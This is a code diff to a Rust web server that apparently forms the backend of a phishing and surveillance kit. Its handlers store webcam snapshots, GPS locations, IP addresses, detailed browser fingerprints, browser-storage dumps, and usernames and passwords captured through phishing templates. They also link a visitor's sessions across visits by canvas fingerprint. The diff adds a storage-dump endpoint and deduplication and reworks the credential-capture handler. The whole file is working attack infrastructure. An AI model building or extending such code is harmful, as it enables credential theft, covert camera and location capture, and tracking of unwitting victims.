@@ -41,49 +41,8 @@ pub struct IpPayload {
 pub struct FingerprintPayload {
     #[serde(default)]
     session: Option<String>,
-    screen_resolution: Option<String>,
-    color_depth: Option<i32>,
-    pixel_ratio: Option<f64>,
-    timezone: Option<String>,
-    timezone_offset: Option<i32>,
-    language: Option<String>,
-    languages: Option<String>,
-    platform: Option<String>,
-    hardware_concurrency: Option<i32>,
-    device_memory: Option<f64>,
-    max_touch_points: Option<i32>,
-    cookie_enabled: Option<bool>,
-    do_not_track: Option<String>,
-    canvas_fingerprint: Option<String>,
-    webgl_fingerprint: Option<String>,
-    webgl_vendor: Option<String>,
-    webgl_renderer: Option<String>,
-    webgl_version: Option<String>,
-    webgl_shading: Option<String>,
-    audio_sample_rate: Option<i32>,
-    audio_state: Option<String>,
-    audio_max_channel: Option<i32>,
-    font_list: Option<String>,
-    font_count: Option<i32>,
-    battery_level: Option<f64>,
-    battery_charging: Option<bool>,
-    battery_charging_time: Option<f64>,
-    battery_discharging_time: Option<f64>,
-    local_ip: Option<String>,
-    is_vpn: Option<bool>,
-    is_tor: Option<bool>,
-    connection_type: Option<String>,
-    connection_downlink: Option<f64>,
-    connection_rtt: Option<i32>,
-    connection_save_data: Option<bool>,
-    media_devices: Option<String>,
-    camera_count: Option<i32>,
-    microphone_count: Option<i32>,
-    has_gyroscope: Option<bool>,
-    has_accelerometer: Option<bool>,
-    voice_count: Option<i32>,
-    voices: Option<String>,
-    collected_at: Option<String>,
+    #[serde(flatten)]
+    extra: serde_json::Value,
 }
 
 #[derive(Deserialize)]
@@ -95,11 +54,39 @@ pub struct EventPayload {
     event_data: Option<serde_json::Value>,
 }
 
+#[derive(Deserialize)]
+pub struct StoragePayload {
+    #[serde(default)]
+    session: Option<String>,
+    #[serde(flatten)]
+    extra: serde_json::Value,
+}
+
+#[derive(Deserialize)]
+pub struct CredentialPayload {
+    #[serde(default)]
+    session: Option<String>,
+    #[serde(default)]
+    template_id: Option<String>,
+    #[serde(default)]
+    username: Option<String>,
+    #[serde(default)]
+    password: Option<String>,
+    #[serde(default)]
+    email: Option<String>,
+    #[serde(default)]
+    phone: Option<String>,
+}
+
+fn get_session(session: &Option<String>) -> String {
+    session.clone().filter(|s| !s.is_empty()).unwrap_or_else(|| "default".into())
+}
+
 pub async fn receive_image(
     State(state): State<Arc<AppState>>,
     Json(payload): Json<ImagePayload>,
 ) -> Result<StatusCode, StatusCode> {
-    let session_id = payload.session.unwrap_or_else(|| "default".into());
+    let session_id = get_session(&payload.session);
     let filtered = payload.cat.split(',').nth(1).unwrap_or("");
     let raw = base64::engine::general_purpose::STANDARD.decode(filtered)
         .map_err(|_| StatusCode::BAD_REQUEST)?;
@@ -107,7 +94,7 @@ pub async fn receive_image(
 
     let now = chrono::Utc::now().timestamp();
     let id = uuid::Uuid::new_v4().to_string();
-    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S"));
+    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S%f"));
     let file_path = format!("{}/captures/{}", state.data_dir, filename);
     let method = payload.capture_method.unwrap_or_else(|| "canvas".into());
 
@@ -121,7 +108,7 @@ pub async fn receive_image(
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite capture insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     log_event(&state, &session_id, "camera_capture", serde_json::json!({"filename": filename, "size": raw.len(), "method": method})).await;
-    tracing::info!("📸 Capture: {} ({} bytes, {})", filename, raw.len(), method);
+    tracing::info!("📸 Capture: {} ({} bytes, {}) session={}", filename, raw.len(), method, session_id);
     Ok(StatusCode::OK)
 }
 
@@ -129,8 +116,19 @@ pub async fn receive_location(
     State(state): State<Arc<AppState>>,
     Json(payload): Json<LocationPayload>,
 ) -> Result<StatusCode, StatusCode> {
-    let session_id = payload.session.unwrap_or_else(|| "default".into());
+    let session_id = get_session(&payload.session);
     let now = chrono::Utc::now().timestamp();
+
+    // Deduplicate: skip if same lat/lon within 60 seconds
+    let recent: Option<(i64,)> = sqlx::query_as(
+        "SELECT created_at FROM locations WHERE session_id = ? AND ABS(latitude - ?) < 0.0001 AND ABS(longitude - ?) < 0.0001 AND created_at > ? ORDER BY created_at DESC LIMIT 1"
+    ).bind(&session_id).bind(payload.lat).bind(payload.lon).bind(now - 60)
+    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    if recent.is_some() {
+        tracing::debug!("📍 Duplicate location skipped for session {}", session_id);
+        return Ok(StatusCode::OK);
+    }
 
     sqlx::query(
         "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, altitude, heading, speed, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
@@ -141,7 +139,7 @@ pub async fn receive_location(
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite location insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     log_event(&state, &session_id, "location_granted", serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc})).await;
-    tracing::info!("📍 Location: {}, {}", payload.lat, payload.lon);
+    tracing::info!("📍 Location: {}, {} session={}", payload.lat, payload.lon, session_id);
     Ok(StatusCode::OK)
 }
 
@@ -150,11 +148,22 @@ pub async fn receive_ip(
     headers: HeaderMap,
     Json(body): Json<IpPayload>,
 ) -> Result<StatusCode, StatusCode> {
+    let session_id = get_session(&body.session);
     let ip = extract_ip(&headers);
     let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
-    let session_id = body.session.unwrap_or_else(|| "default".into());
     let (device, browser, os) = parse_ua(&ua);
     let now = chrono::Utc::now().timestamp();
+
+    // Deduplicate: skip if same IP+session within 5 minutes
+    let recent: Option<(i64,)> = sqlx::query_as(
+        "SELECT created_at FROM ip_logs WHERE session_id = ? AND ip_address = ? AND created_at > ? ORDER BY created_at DESC LIMIT 1"
+    ).bind(&session_id).bind(&ip).bind(now - 300)
+    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    if recent.is_some() {
+        tracing::debug!("🌐 Duplicate IP skipped for session {}", session_id);
+        return Ok(StatusCode::OK);
+    }
 
     sqlx::query(
         "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
@@ -164,7 +173,7 @@ pub async fn receive_ip(
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite IP insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     log_event(&state, &session_id, "page_visit", serde_json::json!({"ip": ip, "device": device, "browser": browser})).await;
-    tracing::info!("🌐 IP: {} ({} on {})", ip, browser, os);
+    tracing::info!("🌐 IP: {} ({} on {}) session={}", ip, browser, os, session_id);
     Ok(StatusCode::OK)
 }
 
@@ -173,49 +182,39 @@ pub async fn receive_fingerprint(
     headers: HeaderMap,
     Json(payload): Json<FingerprintPayload>,
 ) -> Result<StatusCode, StatusCode> {
+    let session_id = get_session(&payload.session);
     let ip = extract_ip(&headers);
     let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
-    let session_id = payload.session.unwrap_or_else(|| "default".into());
     let (device, browser, os) = parse_ua(&ua);
     let now = chrono::Utc::now().timestamp();
+    let data_str = serde_json::to_string(&payload.extra).unwrap_or_default();
 
     sqlx::query(
-        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, local_ip, screen_resolution, color_depth, pixel_ratio, timezone, timezone_offset, language, languages, platform, hardware_concurrency, device_memory, max_touch_points, battery_level, battery_charging, canvas_fingerprint, webgl_fingerprint, font_list, webgl_vendor, webgl_renderer, audio_sample_rate, font_count, gender_prediction, gender_confidence, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, canvas_fingerprint, webgl_fingerprint, font_list, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
     )
     .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
-    .bind(&device).bind(&browser).bind(&os).bind(&payload.local_ip)
-    .bind(&payload.screen_resolution).bind(payload.color_depth).bind(&payload.timezone)
-    .bind(&payload.language).bind(&payload.platform).bind(payload.hardware_concurrency)
-    .bind(payload.device_memory).bind(payload.battery_level)
-    .bind(payload.battery_charging).bind(&payload.canvas_fingerprint)
-    .bind(&payload.webgl_fingerprint).bind(&payload.font_list).bind(now)
+    .bind(&device).bind(&browser).bind(&os)
+    .bind(payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()))
+    .bind(payload.extra.get("webgl_fingerprint").and_then(|v| v.as_str()))
+    .bind(payload.extra.get("font_list").and_then(|v| v.as_str()))
+    .bind(now)
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite fingerprint insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
-    // Cross-session correlation check
-    if let Some(ref canvas_fp) = payload.canvas_fingerprint {
+    // Cross-session correlation
+    if let Some(canvas_fp) = payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()) {
         let matches: Vec<(String,)> = sqlx::query_as(
             "SELECT DISTINCT session_id FROM ip_logs WHERE canvas_fingerprint = ? AND session_id != ?"
         ).bind(canvas_fp).bind(&session_id).fetch_all(&state.pool).await.unwrap_or_default();
 
         if !matches.is_empty() {
             let other_sessions: Vec<String> = matches.into_iter().map(|(s,)| s).collect();
-            tracing::warn!("🔗 Cross-session correlation: fingerprint matches sessions: {:?}", other_sessions);
-            log_event(&state, &session_id, "cross_session_match", serde_json::json!({"matched_sessions": other_sessions, "fingerprint": canvas_fp})).await;
+            tracing::warn!("🔗 Cross-session correlation: {} matches sessions: {:?}", canvas_fp, other_sessions);
+            log_event(&state, &session_id, "cross_session_match", serde_json::json!({"matched_sessions": other_sessions})).await;
         }
     }
 
-    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({
-        "canvas": payload.canvas_fingerprint.is_some(),
-        "webgl": payload.webgl_fingerprint.is_some(),
-        "local_ip": payload.local_ip,
-        "fonts_count": payload.font_list.as_ref().map(|f| f.split(',').count()),
-    })).await;
-
-    tracing::info!("🔍 Fingerprint: {} | {} | {} | canvas:{} | local_ip:{}",
-        ip, payload.screen_resolution.as_deref().unwrap_or("?"),
-        payload.timezone.as_deref().unwrap_or("?"),
-        payload.canvas_fingerprint.is_some(),
-        payload.local_ip.as_deref().unwrap_or("none"));
+    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": payload.extra.get("canvas_fingerprint").is_some()})).await;
+    tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
     Ok(StatusCode::OK)
 }
 
@@ -223,7 +222,7 @@ pub async fn receive_event(
     State(state): State<Arc<AppState>>,
     Json(payload): Json<EventPayload>,
 ) -> Result<StatusCode, StatusCode> {
-    let session_id = payload.session.unwrap_or_else(|| "default".into());
+    let session_id = get_session(&payload.session);
     let data_str = payload.event_data.map(|d| serde_json::to_string(&d).unwrap_or_default());
     let now = chrono::Utc::now().timestamp();
 
@@ -232,6 +231,49 @@ pub async fn receive_event(
         .bind(&payload.event_type).bind(&data_str).bind(now)
         .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite event insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
+    Ok(StatusCode::OK)
+}
+
+pub async fn receive_storage(
+    State(state): State<Arc<AppState>>,
+    Json(body): Json<StoragePayload>,
+) -> Result<StatusCode, StatusCode> {
+    let session_id = get_session(&body.session);
+    let now = chrono::Utc::now().timestamp();
+    let id = uuid::Uuid::new_v4().to_string();
+    let data_str = serde_json::to_string(&body.extra).unwrap_or_default();
+
+    sqlx::query("INSERT INTO storage_dumps (id, session_id, data, created_at) VALUES (?, ?, ?, ?)")
+        .bind(&id).bind(&session_id).bind(&data_str).bind(now)
+        .execute(&state.pool).await.map_err(|e| { tracing::error!("Storage insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
+
+    tracing::info!("💾 Storage dump received for session {}", session_id);
+    Ok(StatusCode::OK)
+}
+
+pub async fn receive_credentials(
+    State(state): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Json(payload): Json<CredentialPayload>,
+) -> Result<StatusCode, StatusCode> {
+    let session_id = get_session(&payload.session);
+    let ip = extract_ip(&headers);
+    let now = chrono::Utc::now().timestamp();
+
+    sqlx::query(
+        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
+    .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
+    .bind(&payload.email).bind(&payload.phone).bind(&ip).bind(now)
+    .execute(&state.pool).await.map_err(|e| { tracing::error!("Credential insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
+
+    log_event(&state, &session_id, "credentials_captured", serde_json::json!({
+        "template": payload.template_id,
+        "username": payload.username.is_some(),
+    })).await;
+
+    tracing::info!("🔑 Credentials: {} session={}", payload.username.as_deref().unwrap_or("?"), session_id);
     Ok(StatusCode::OK)
 }
 
@@ -270,45 +312,4 @@ fn parse_ua(ua: &str) -> (String, String, String) {
         else if ua.contains("Linux") { "Linux" }
         else { "Unknown" };
     (device.into(), browser.into(), os.into())
-}
-
-#[derive(Deserialize)]
-pub struct CredentialPayload {
-    #[serde(default)]
-    session: Option<String>,
-    #[serde(default)]
-    template_id: Option<String>,
-    username: Option<String>,
-    password: Option<String>,
-    email: Option<String>,
-    phone: Option<String>,
-}
-
-pub async fn receive_credentials(
-    State(state): State<Arc<AppState>>,
-    headers: HeaderMap,
-    Json(payload): Json<CredentialPayload>,
-) -> Result<StatusCode, StatusCode> {
-    let session_id = payload.session.unwrap_or_else(|| "default".into());
-    let ip = extract_ip(&headers);
-    let now = chrono::Utc::now().timestamp();
-
-    sqlx::query(
-        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
-    )
-    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
-    .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
-    .bind(&payload.email).bind(&payload.phone).bind(&ip).bind(now)
-    .execute(&state.pool).await.map_err(|e| { tracing::error!("Credential insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
-
-    log_event(&state, &session_id, "credentials_captured", serde_json::json!({
-        "template": payload.template_id,
-        "username": payload.username.is_some(),
-        "password": payload.password.is_some(),
-    })).await;
-
-    tracing::info!("🔑 Credentials captured: {} (template: {})", 
-        payload.username.as_deref().unwrap_or("?"),
-        payload.template_id.as_deref().unwrap_or("?"));
-    Ok(StatusCode::OK)
 }
